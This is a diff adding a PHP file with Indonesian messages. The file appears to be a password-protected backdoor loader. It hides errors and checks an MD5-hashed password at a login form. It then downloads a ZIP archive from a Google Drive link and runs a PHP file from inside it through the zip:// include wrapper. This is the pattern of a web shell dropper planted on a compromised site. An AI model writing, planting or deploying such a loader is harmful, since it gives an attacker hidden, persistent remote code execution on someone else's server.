@@ -1,0 +1,63 @@
+<?php
+
+session_start();
+@ini_set('display_errors', 0);
+
+$stored_hash = "93ddc869400d233ac756aa8847e5092d";
+if (!isset($_SESSION['logged_in'])) {
+
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $password = $_POST['password'];
+
+        if (md5($password) === $stored_hash) {
+            $_SESSION['logged_in'] = true;
+            header("Refresh:0");
+            exit();
+        }
+    }
+
+    ?>
+    <form method="POST">
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Masuk</button>
+    </form>
+    <?php
+    exit();
+}
+
+$zipFile = __DIR__ . '/dorm.zip';
+$insideFile = 'folder/red.php';
+
+$downloadUrl = 'https://drive.usercontent.google.com/u/0/uc?id=188ZZJzCR8HcRPPdXeSDJ9_TYIo2Gbq_3&export=download';
+
+if (!file_exists($zipFile)) {
+    echo "ZIP belum ada, sedang download...\n";
+
+    $fp = fopen($zipFile, 'w+');
+
+    $ch = curl_init($downloadUrl);
+    curl_setopt($ch, CURLOPT_FILE, $fp);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+
+    curl_exec($ch);
+
+    if (curl_errno($ch)) {
+        fclose($fp);
+        unlink($zipFile);
+        die("Gagal download: " . curl_error($ch));
+    }
+
+    curl_close($ch);
+    fclose($fp);
+
+    echo "Download selesai.\n";
+}
+
+$path = "zip://$zipFile#$insideFile";
+
+if (file_exists($zipFile)) {
+    include $path;
+} else {
+    echo "ZIP tidak ditemukan";
+}
